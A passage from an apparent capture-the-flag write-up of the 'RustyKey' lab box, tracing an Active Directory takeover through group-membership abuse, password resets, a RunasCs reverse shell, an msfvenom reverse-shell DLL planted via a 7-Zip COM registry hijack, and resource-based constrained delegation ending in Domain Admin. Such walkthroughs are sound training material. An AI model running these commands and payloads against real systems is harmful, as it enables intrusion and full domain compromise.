+LDAP        dc.rustykey.htb 389    DC               [+] rustykey.htb\IT-Computer3$:Rusty88! </code></pre><p>I have compromise the machine account <code>IT-Computer3$</code></p><h2>Bloodhound enumeration as <code>it-computer3$</code></h2><p><img src="images/rustykey/pasted-image-20261017192935.webp" alt="Screenshot" loading="lazy" /></p><p>I have AddSelf on the helpdesk group</p><h2>Adding <code>it-computer3$</code> to the helpdesk group</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ bloodyAD --host dc.rustykey.htb -d rustykey.htb -u &#39;it-computer3$&#39; -p &#39;Rusty88!&#39; -k add groupMember &#39;helpdesk&#39; &#39;it-computer3$&#39;
+Clock skew detected. Adjusting local time by 7:59:59.544453. Retrying operation.
+[+] it-computer3$ added to helpdesk</code></pre><p>Ill then add the computer account to the group</p><p><img src="images/rustykey/pasted-image-20261019163153.webp" alt="Screenshot" loading="lazy" /></p><p>This group has some interesting permissions</p><p>And after looking at the protected objects group i see that group is also a member of protected users, in this group is <code>bb.morgan</code> <code>ee.reed</code> and <code>gg.anderson</code>, and all of these users are also part of remote management users as well. But with AddMember on the group i can likely remove them from protected users if i need to</p><h2>Attempting compromise of <code>bb.morgan</code> <code>ee.reed</code> and <code>gg.anderson</code></h2><p><img src="images/rustykey/pasted-image-20261019163723.webp" alt="Screenshot" loading="lazy" /></p><p>Ill change all of their passwords!</p><p>Both <code>bb.morgan</code> and <code>ee.reed</code> give the error <code>KDC_ERR_ETYPE_NOSUPP</code> when trying to auth and <code>gg.anderson</code> shows an error suggesting the account is disabled, and checking bloodhound the account is disabled</p><p><img src="images/rustykey/pasted-image-20261019164441.webp" alt="Screenshot" loading="lazy" /></p><p>As seen from the setup, the users arent directly part of the group, so in order to remove them i have to specify the group they are attached to</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ bloodyAD --host dc.rustykey.htb -d rustykey.htb -u &#39;it-computer3$&#39; -p &#39;Rusty88!&#39; -k remove groupMember &#39;protected objects&#39; &#39;CN=IT,CN=USERS,DC=RUSTYKEY,DC=HTB&#39;     
+Clock skew detected. Adjusting local time by 7:59:59.072788. Retrying operation.
+[+] CN=IT,CN=USERS,DC=RUSTYKEY,DC=HTB removed from protected objects
+
+❯❯❯ bloodyAD --host dc.rustykey.htb -d rustykey.htb -u &#39;it-computer3$&#39; -p &#39;Rusty88!&#39; -k remove groupMember &#39;protected objects&#39; &#39;CN=SUPPORT,CN=USERS,DC=RUSTYKEY,DC=HTB&#39;
+Clock skew detected. Adjusting local time by 7:59:58.816041. Retrying operation.
+[+] CN=SUPPORT,CN=USERS,DC=RUSTYKEY,DC=HTB removed from protected objects</code></pre><p>Now they should be removed from the group</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ faketime -f +8h nxc ldap dc.rustykey.htb -u &#39;bb.morgan&#39; -p &#39;Password123!&#39; -k
+LDAP        dc.rustykey.htb 389    DC               [*] None (name:DC) (domain:rustykey.htb) (signing:None) (channel binding:No TLS cert) (NTLM:False)
+LDAP        dc.rustykey.htb 389    DC               [+] rustykey.htb\bb.morgan:Password123!</code></pre><p>I can auth as <code>bb.morgan</code></p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ faketime -f +8h nxc smb dc.rustykey.htb -u &#39;ee.reed&#39; -p &#39;Password123!&#39; -k 
+SMB         dc.rustykey.htb 445    dc               [*]  x64 (name:dc) (domain:rustykey.htb) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc.rustykey.htb 445    dc               [-] rustykey.htb\ee.reed:Password123! STATUS_LOGON_TYPE_NOT_GRANTED
+
+❯❯❯ faketime -f +8h nxc smb dc.rustykey.htb -u &#39;gg.anderson&#39; -p &#39;Password123!&#39; -k
+SMB         dc.rustykey.htb 445    dc               [*]  x64 (name:dc) (domain:rustykey.htb) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc.rustykey.htb 445    dc               [-] rustykey.htb\gg.anderson:Password123! KDC_ERR_CLIENT_REVOKED</code></pre><p>However the other two users still show errors, <code>gg.anderson</code> is failing becuause the account is disabled, but i have no privs to re enable it</p><p><code>ee.reed</code> is more interesting since this user has not been granted logon rights, but i also cannot add them</p><p>So at this point it looks like i can only compromise <code>bb.morgan</code> out of these users</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ faketime -f +8h nxc smb dc.rustykey.htb -u &#39;bb.morgan&#39; -p &#39;Password123!&#39; -k --generate-tgt bb.morgan  
+SMB         dc.rustykey.htb 445    dc               [*]  x64 (name:dc) (domain:rustykey.htb) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc.rustykey.htb 445    dc               [+] rustykey.htb\bb.morgan:Password123! 
+SMB         dc.rustykey.htb 445    dc               [+] TGT saved to: bb.morgan.ccache
+SMB         dc.rustykey.htb 445    dc               [+] Run the following command to use the TGT: export KRB5CCNAME=bb.morgan.ccache</code></pre><p>I can get a TGT for this user</p><h2>Winrm access <code>bb.morgan</code></h2><p>So i still have privileges over <code>dd.ali</code> which i have not looked into yet, so if this turns out to be a dead end ill go back to that</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ export KRB5CCNAME=bb.morgan.ccache
+
+❯❯❯ faketime -f +8h evil-winrm-py -i dc.rustykey.htb -k --no-pass
+          _ _            _                             
+  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
+ / -_\ V | | |___\ V  V | | &#39; \| &#39;_| &#39;  |___| &#39;_ | || |
+ \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
+                                            |_|   |__/  v1.6.0
+
+[*] Connecting to &#39;dc.rustykey.htb:5985&#39; as &#39;bb.morgan@RUSTYKEY.HTB&#39;
+evil-winrm-py PS C:\Users\bb.morgan\Documents&gt;</code></pre><p>So ill login over WINRN and look around the file system</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">evil-winrm-py PS C:\Users\bb.morgan\Desktop&gt; dir
+
+
+    Directory: C:\Users\bb.morgan\Desktop
+
+
+Mode                LastWriteTime         Length Name                                                                   
+----                -------------         ------ ----                                                                   
+-a----         6/4/2025   9:15 AM           1976 internal.pdf                                                           
+-ar---       10/19/2026   4:27 PM             34 user.txt                                                               
+
+
+evil-winrm-py PS C:\Users\bb.morgan\Desktop&gt;</code></pre><p>I can get the user flag, there is also an interesting pdf file which i will download</p><h2>Enumeration of the file system</h2><p><img src="images/rustykey/pasted-image-20261019170220.webp" alt="Screenshot" loading="lazy" /></p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">evil-winrm-py PS C:\Program Files&gt; dir
+
+
+    Directory: C:\Program Files
+
+
+Mode                LastWriteTime         Length Name                                                                   
+----                -------------         ------ ----                                                                   
+d-----       12/26/2024   8:24 PM                7-Zip                                                                  
+d-----       12/26/2024   4:28 PM                Common Files                                                           
+d-----        6/24/2025   9:59 AM                internet explorer                                                      
+d-----        7/24/2025   1:14 AM                VMware                                                                 
+d-r---        5/30/2025   3:02 PM                Windows Defender                                                       
+d-----        6/24/2025   9:59 AM                Windows Defender Advanced Threat Protection                            
+d-----        11/5/2022  12:03 PM                Windows Mail                                                           
+d-----         6/5/2025   7:54 AM                Windows Media Player                                                   
+d-----        9/15/2018  12:19 AM                Windows Multimedia Platform                                            
+d-----        9/15/2018  12:28 AM                windows nt                                                             
+d-----        11/5/2022  12:03 PM                Windows Photo Viewer                                                   
+d-----        9/15/2018  12:19 AM                Windows Portable Devices                                               
+d-----        9/15/2018  12:19 AM                Windows Security                                                       
+d-----        9/15/2018  12:19 AM                WindowsPowerShell                                                      
+
+
+evil-winrm-py PS C:\Program Files&gt;</code></pre><p>Whats also interesting is there is 7-zip installed, there is a hint in the PDF about file archiving</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">evil-winrm-py PS C:\Program Files\7-Zip&gt; type readme.txt
+7-Zip 24.08
+-----------
+
+7-Zip is a file archiver for Windows.
+
+7-Zip Copyright (C) 1999-2024 Igor Pavlov.
+
+The main features of 7-Zip: 
+
+...[SNIP]...</code></pre><p>I now have the version, and after some research i see there is an exploit for this!</p><blockquote><p>7-Zip version 24.08 is explicitly affected by a critical remote code execution (RCE) vulnerability tracked as CVE-2025-0411. It fails to propagate the Mark-of-the-Web (MotW) security warning to files extracted from crafted archives</p></blockquote><p>This may not be the path and may just be a rabbit hole, but i will keep looking</p><p>Its also worth noting <code>ee.reed</code> is part of the support group, the pdf explicitly mentions the support group, now i have access over winrm it might be worth using runascs to get a shell as <code>ee.reed</code></p><h2>Shell as <code>ee.reed</code></h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">evil-winrm-py PS C:\Temp&gt; upload RunasCs.exe .
+Uploading /home/kali/htb/RustyKey/RunasCs.exe: 100%|█████████████████████| 50.5k/50.5k [00:00&lt;00:00, 167kB/s]
+[+] File uploaded successfully as: C:\Temp\RunasCs.exe
+evil-winrm-py PS C:\Temp&gt; dir
+
+
+    Directory: C:\Temp
+
+
+Mode                LastWriteTime         Length Name                                                                   
+----                -------------         ------ ----                                                                   
+-a----       10/19/2026   5:23 PM          51712 RunasCs.exe                                                            
+
+
+evil-winrm-py PS C:\Temp&gt;</code></pre><p>Ill upload the tool, i just downloaded the release from the github page</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ penelope -p 1337   
+[+] Listening for reverse shells on 0.0.0.0:1337 -&gt; 127.0.0.1 • 192.168.86.128 • 10.10.14.61
+➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)</code></pre><p>ill start a listener</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">evil-winrm-py PS C:\Temp&gt; .\RunasCs.exe ee.reed Password123! cmd.exe -r 10.10.14.61:1337
+[*] Warning: User profile directory for user ee.reed does not exists. Use --force-profile if you want to force the creation.
+[*] Warning: The logon for user &#39;ee.reed&#39; is limited. Use the flag combination --bypass-uac and --logon-type &#39;8&#39; to obtain a more privileged token.
+
+[+] Running in session 0 with process function CreateProcessWithLogonW()
+[+] Using Station\Desktop: Service-0x0-3ac872$\Default</code></pre><p>Then ill run it to get a shell</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ penelope -p 1337   
+[+] Listening for reverse shells on 0.0.0.0:1337 -&gt; 127.0.0.1 • 192.168.86.128 • 10.10.14.61
+➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
+[+] [New Reverse Shell] =&gt; DC 10.129.232.127 Microsoft_Windows_Server_2019_Standard-x64-based_PC 👤 rustykey\ee.reed 😍️ Session ID &lt;1&gt;
+[+] Added readline support...
+[+] Interacting with session [1] • Readline • Menu key Ctrl-D ⇐
+[+] Session log: /home/kali/.penelope/sessions/DC~10.129.232.127-Microsoft_Windows_Server_2019_Standard-x64-based_PC/2026_10_19-17_26_41-960.log
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────
+C:\Windows\system32&gt;
+
+C:\Windows\system32&gt;whoami
+whoami
+rustykey\ee.reed
+
+C:\Windows\system32&gt;</code></pre><p>I now have a shell</p><p>Its worth noting that in order for the shell to work, you need to re run the steps of adding the <code>it-computer3$</code> to the helpdesk group then changing the password of <code>ee.reed</code> and then removing support group from the protected objects group, since there is a cleanup script running</p><p>My thinking is this user, since they are apart of the support group may have some more perms on 7zip in some way</p><p>Returning to the PDF it mentions context menu actions, which could relate to the registry</p><h2>Shell as <code>mm.turner</code></h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">PS C:\&gt; Get-Acl &quot;Registry::HKEY_CLASSES_ROOT\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32&quot; | fl
+
+
+Path   : Microsoft.PowerShell.Core\Registry::HKEY_CLASSES_ROOT\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServe
+         r32
+Owner  : BUILTIN\Administrators
+Group  : RUSTYKEY\Domain Users
+Access : APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  ReadKey
+         BUILTIN\Administrators Allow  FullControl
+         CREATOR OWNER Allow  FullControl
+         RUSTYKEY\Support Allow  FullControl
+         NT AUTHORITY\SYSTEM Allow  FullControl
+         BUILTIN\Administrators Allow  FullControl
+         BUILTIN\Users Allow  ReadKey
+Audit  : 
+Sddl   : O:BAG:DUD:AI(A;CIID;KR;;;AC)(A;ID;KA;;;BA)(A;CIIOID;KA;;;CO)(A;CIID;KA;;;S-1-5-21-3316070415-896458127-4139322
+         052-1132)(A;CIID;KA;;;SY)(A;CIIOID;KA;;;BA)(A;CIID;KR;;;BU)
+
+
+
+PS C:\&gt; </code></pre><p>With the help of AI ill query the registry for some interesting permissions</p><p>As seen here the <code>support</code> group has <code>FullControll</code> over this path</p><p>I think the best way to abuse this would be to modify the DLL it loads to a malicious one to get a reverse shell</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.61 LPORT=1338 -f dll -o shell.dll 
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of dll file: 9216 bytes
+Saved as: shell.dll</code></pre><p>Ill craft a payload using msfvenom</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ penelope -p 1338   
+[+] Listening for reverse shells on 0.0.0.0:1338 -&gt; 127.0.0.1 • 192.168.86.128 • 10.10.14.61
+➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)</code></pre><p>Ill start a listener</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">evil-winrm-py PS C:\Temp&gt; upload shell.dll .
+Uploading /home/kali/htb/RustyKey/shell.dll: 100%|███████████████████████| 9.00k/9.00k [00:00&lt;00:00, 138kB/s]
+[+] File uploaded successfully as: C:\Temp\shell.dll
+evil-winrm-py PS C:\Temp&gt;</code></pre><p>Ill use my evil-winrm session to make the upload simpler</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">evil-winrm-py PS C:\Temp&gt; icacls &quot;shell.dll&quot; /grant Everyone:F
+processed file: shell.dll
+Successfully processed 1 files; Failed processing 0 files
+evil-winrm-py PS C:\Temp&gt;</code></pre><p>Then ill give all users full control over the file so <code>ee.reed</code> can use the file</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">PS C:\Temp&gt; Set-ItemProperty &quot;Registry::HKEY_CLASSES_ROOT\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32&quot; -Name &quot;(default)&quot; -Value &quot;C:\Temp\shell.dll&quot;
+PS C:\Temp&gt; </code></pre><p>Ill then set the value to my malicious DLL</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ penelope -p 1338   
+[+] Listening for reverse shells on 0.0.0.0:1338 -&gt; 127.0.0.1 • 192.168.86.128 • 10.10.14.61
+➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
+[+] [New Reverse Shell] =&gt; DC 10.129.232.127 Microsoft_Windows_Server_2019_Standard-x64-based_PC 👤 rustykey\mm.turner 😍️ Session ID &lt;1&gt;
+[+] Added readline support...
+[+] Interacting with session [1] • Readline • Menu key Ctrl-D ⇐
+[+] Session log: /home/kali/.penelope/sessions/DC~10.129.232.127-Microsoft_Windows_Server_2019_Standard-x64-based_PC/2026_10_19-18_06_37-732.log
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────
+C:\Windows&gt;whoami
+whoami
+rustykey\mm.turner
+
+C:\Windows&gt;</code></pre><p>Then i can get a shell as this user</p><h2>Enumeration as <code>mm.turner</code></h2><p><img src="images/rustykey/pasted-image-20261019180822.webp" alt="Screenshot" loading="lazy" /></p><p>This looks like delegation abuse</p><h2>SPN-less resource based constrained delegation leads to compromise of <code>backupadmin</code></h2><p>I do not control a computer account with an SPN set</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ faketime -f +8h nxc ldap dc.rustykey.htb -u &#39;IT-Computer3$&#39; -p &#39;Rusty88!&#39; -k -M maq
+LDAP        dc.rustykey.htb 389    DC               [*] None (name:DC) (domain:rustykey.htb) (signing:None) (channel binding:No TLS cert) (NTLM:False)
+LDAP        dc.rustykey.htb 389    DC               [+] rustykey.htb\IT-Computer3$:Rusty88! 
+MAQ         dc.rustykey.htb 389    DC               [*] Getting the MachineAccountQuota
+MAQ         dc.rustykey.htb 389    DC               MachineAccountQuota: 0</code></pre><p>The machine account quota is also zero so i cannot create a computer account, this forces me to use the SPN less method</p><p><a href="https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd" target="_blank" rel="noreferrer">https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd</a></p><p>Since i do not have any credentials i cant really do this remotely and also using rubeus to get a TGT also fails in this instance so i am forced to use powershell to do this</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">PS C:\Temp&gt; Get-ADComputer DC -Properties PrincipalsAllowedToDelegateToAccount
+Get-ADComputer DC -Properties PrincipalsAllowedToDelegateToAccount
+
+
+DistinguishedName                    : CN=DC,OU=Domain Controllers,DC=rustykey,DC=htb
+DNSHostName                          : dc.rustykey.htb
+Enabled                              : True
+Name                                 : DC
+ObjectClass                          : computer
+ObjectGUID                           : dee94947-219e-4b13-9d41-543a4085431c
+PrincipalsAllowedToDelegateToAccount : {}
+SamAccountName                       : DC$
+SID                                  : S-1-5-21-3316070415-896458127-4139322052-1000
+UserPrincipalName                    : 
+
+
+
+PS C:\Temp&gt; </code></pre><p>Ill read the <code>dc$</code> account attribute, currently nothing is configured</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">PS C:\Temp&gt; Set-ADComputer DC -PrincipalsAllowedToDelegateToAccount it-computer3$</code></pre><p>Ill then set it up for a machine account i control</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">PS C:\Temp&gt; Get-ADComputer DC -Properties PrincipalsAllowedToDelegateToAccount
+
+
+DistinguishedName                    : CN=DC,OU=Domain Controllers,DC=rustykey,DC=htb
+DNSHostName                          : dc.rustykey.htb
+Enabled                              : True
+Name                                 : DC
+ObjectClass                          : computer
+ObjectGUID                           : dee94947-219e-4b13-9d41-543a4085431c
+PrincipalsAllowedToDelegateToAccount : {CN=IT-Computer3,OU=Computers,OU=IT,DC=rustykey,DC=htb}
+SamAccountName                       : DC$
+SID                                  : S-1-5-21-3316070415-896458127-4139322052-1000
+UserPrincipalName                    : 
+
+
+
+PS C:\Temp&gt; </code></pre><p>Then running the same command again i now see its setup for the <code>it-computer3$</code></p><p>Now i can request the ticket, but the impersonation of administrator fails</p><p><img src="images/rustykey/pasted-image-20261019194858.webp" alt="Screenshot" loading="lazy" /></p><p>Now checking bloodhound i see its becuase this user is marked sensitive, this fails because of this</p><p><img src="images/rustykey/pasted-image-20261019194952.webp" alt="Screenshot" loading="lazy" /></p><p>However there is a backupadmin which is in the administrators group, this user is not marked as sensitive</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ faketime -f +8h getST.py -spn &#39;cifs/DC.rustykey.htb&#39; -impersonate &#39;backupadmin&#39; &#39;rustykey.htb/IT-Computer3$:Rusty88!&#39; -k     
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
+
+[-] CCache file is not found. Skipping...
+[*] Getting TGT for user
+[*] Impersonating backupadmin
+[*] Requesting S4U2self
+[*] Requesting S4U2Proxy
+[*] Saving ticket in backupadmin@cifs_DC.rustykey.htb@RUSTYKEY.HTB.ccache</code></pre><p>Then i can request a ticket</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ export KRB5CCNAME=backupadmin@cifs_DC.rustykey.htb@RUSTYKEY.HTB.ccache 
+
+❯❯❯ faketime -f +8h nxc smb dc.rustykey.htb --use-kcache   
+SMB         dc.rustykey.htb 445    dc               [*]  x64 (name:dc) (domain:rustykey.htb) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc.rustykey.htb 445    dc               [+] rustykey.htb\backupadmin from ccache (Pwn3d!)</code></pre><p>This user is compromised!</p><p>Also the pwned indicator showing this user is an admin</p><h2>Domain Admin</h2><p><img src="images/rustykey/pasted-image-20261019195545.webp" alt="Screenshot" loading="lazy" /></p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ faketime -f +8h bloodyAD --host dc.rustykey.htb -d rustykey.htb -k add genericAll &#39;Administrator&#39; &#39;backupadmin&#39;
+[+] backupadmin has now GenericAll on Administrator</code></pre><p>With WriteDACL ill just add GenericAll</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ faketime -f +8h bloodyAD --host dc.rustykey.htb -d rustykey.htb -k set password &#39;Administrator&#39; &#39;Password123!&#39;
+[+] Password changed successfully!</code></pre><p>Then ill just change the password for the user</p><p><img src="images/rustykey/pasted-image-20261019200123.webp" alt="Screenshot" loading="lazy" /></p><p>Then i can login as the DA</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">evil-winrm-py PS C:\Users\Administrator\Desktop&gt; whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                            Description                                                        State  
+========================================= ================================================================== =======
+SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
+SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
+SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
+SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
+SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
+SeSystemProfilePrivilege                  Profile system performance                                         Enabled
+SeSystemtimePrivilege                     Change the system time                                             Enabled
+SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
+SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
+SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
+SeBackupPrivilege                         Back up files and directories                                      Enabled
+SeRestorePrivilege                        Restore files and directories                                      Enabled
+SeShutdownPrivilege                       Shut down the system                                               Enabled
+SeDebugPrivilege                          Debug programs                                                     Enabled
+SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
+SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
+SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
+SeUndockPrivilege                         Remove computer from docking station                               Enabled
+SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
+SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
+SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
+SeCreateGlobalPrivilege                   Create global objects                                              Enabled
+SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
+SeTimeZonePrivilege                       Change the time zone                                               Enabled
+SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
+SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
+evil-winrm-py PS C:\Users\Administrator\Desktop&gt;</code></pre><p>Domain Admin!</p></div><footer class="writeup-article-footer"><nav class="writeup-viewer-pagination writeup-page-pager" aria-label="More writeups"><a class="action secondary writeup-nav-button" href="/writeups/htb/ethan-bauer/htb-acute/" rel="prev"><span class="writeup-nav-direction">Previous</span><span class="writeup-nav-title">Acute</span></a><a class="action secondary writeup-nav-button" href="/writeups/htb/ethan-bauer/htb-dump/" rel="next"><span class="writeup-nav-direction">Next</span><span class="writeup-nav-title">Dump</span></a></nav><a href="/writeups/">← All writeups</a></footer></article></main><footer class="site-footer site-footer-unified"><div class="footer-brand"><strong>Paracausal Telemetry</strong><blockquote class="footer-quote"><p>&ldquo;Curiouser and curiouser.&rdquo;</p><span class="footer-quote-cite">Lewis Carroll</span></blockquote></div><div class="footer-nav-groups"><div class="footer-nav-group"><span>Explore</span><nav class="footer-links" aria-label="Primary footer navigation"><a href="/writeups/">Writeups</a><a href="/cpts/">CPTS</a><a href="/links/">Links</a><a href="/field-guides/">Field guides</a><a href="/#talks">Talks</a><a href="/#observer">Observer</a><a href="/#threat-actors">Threat Actors</a><a href="https://alchemist.paracausaltelemetry.com/" aria-label="Alchemist (opens the separate Alchemist app)">Alchemist<svg class="nav-external" viewBox="0 0 12 12" aria-hidden="true" focusable="false"><path d="M4 2h6v6M10 2 3 9"/></svg></a></nav></div></div><p class="footer-note"><span>paracausaltelemetry.com</span><span>2026</span></p></footer></div><script type="module" src="/js/writeup-page.js?v=search2"></script></body></html>
